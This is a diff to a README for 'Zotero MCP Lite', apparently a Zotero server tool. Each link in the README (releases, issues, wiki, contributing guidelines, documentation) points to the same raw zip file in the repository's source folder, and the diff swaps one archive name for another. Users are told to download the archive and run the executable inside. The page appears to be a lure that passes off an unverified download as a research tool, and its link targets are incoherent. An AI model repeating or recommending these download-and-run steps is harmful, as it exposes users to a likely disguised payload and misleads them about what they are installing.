@@ -6,7 +6,7 @@ Welcome to **Zotero MCP Lite**, the fast and customizable server designed for yo
 
 ## 📥 Download the Application
 
-[![Download Zotero MCP Lite](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip%20MCP%20Lite-brightgreen)](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip)
+[![Download Zotero MCP Lite](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip%20MCP%20Lite-brightgreen)](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip)
 
 Visit the Releases page to download the latest version of Zotero MCP Lite.
 
@@ -26,13 +26,13 @@ To run Zotero MCP Lite, your system should meet the following requirements:
   
 ## 📥 Download & Install
 
-1. **Visit the [Releases page](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip)**.
+1. **Visit the [Releases page](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip)**.
 2. Locate the latest version of Zotero MCP Lite.
 3. Click on the release title to view the assets available for download.
 4. Download the appropriate file for your operating system:
-   - For Windows, download `https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip`.
-   - For Mac, download `https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip`.
-   - For Linux, download `https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip`.
+   - For Mac, download `https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip`.
 5. After downloading, locate the downloaded file on your computer.
 6. Extract the files if necessary (often done by right-clicking the zip file and selecting "Extract All").
 7. Open the extracted folder and locate the executable file to run the software.
@@ -41,7 +41,7 @@ To run Zotero MCP Lite, your system should meet the following requirements:
 
 Once you have installed Zotero MCP Lite:
 
-1. Double-click the executable file (e.g., `https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip` on Windows or `zotero-mcp-lite` on Mac/Linux).
+1. Double-click the executable file (e.g., `https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip` on Windows or `zotero-mcp-lite` on Mac/Linux).
 2. Wait for the application to launch.
 3. Follow the on-screen instructions to set up your server.
 
@@ -59,15 +59,15 @@ Once you have installed Zotero MCP Lite:
 
 ### How do I report issues with the software?
 
-Please visit the [Issues page](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip) in this repository. You can file a ticket to describe the problem you encounter.
+Please visit the [Issues page](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip) in this repository. You can file a ticket to describe the problem you encounter.
 
 ### Can I contribute to the project?
 
-Yes! We welcome contributions from anyone. Check the [Contributing Guidelines](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip) for more details.
+Yes! We welcome contributions from anyone. Check the [Contributing Guidelines](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip) for more details.
 
 ### Where can I get more help?
 
-Visit our [Wiki](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip) for detailed explanations on all features.
+Visit our [Wiki](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip) for detailed explanations on all features.
 
 ## 📞 Contact
 
@@ -75,8 +75,8 @@ If you have questions or need further assistance, feel free to reach out through
 
 ## 🔗 Quick Links
 
-- [Releases page](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip)
-- [Documentation](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip)
-- [Issues](https://github.com/alexobiwan-creator/zotero-mcp-lite/raw/refs/heads/main/src/zotero_lite_mcp_indetermined.zip)
+- [Releases page](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip)
+- [Issues](https://raw.githubusercontent.com/alexobiwan-creator/zotero-mcp-lite/main/src/mcp-zotero-lite-v1.8.zip)
 
 Thank you for choosing Zotero MCP Lite! Happy researching!
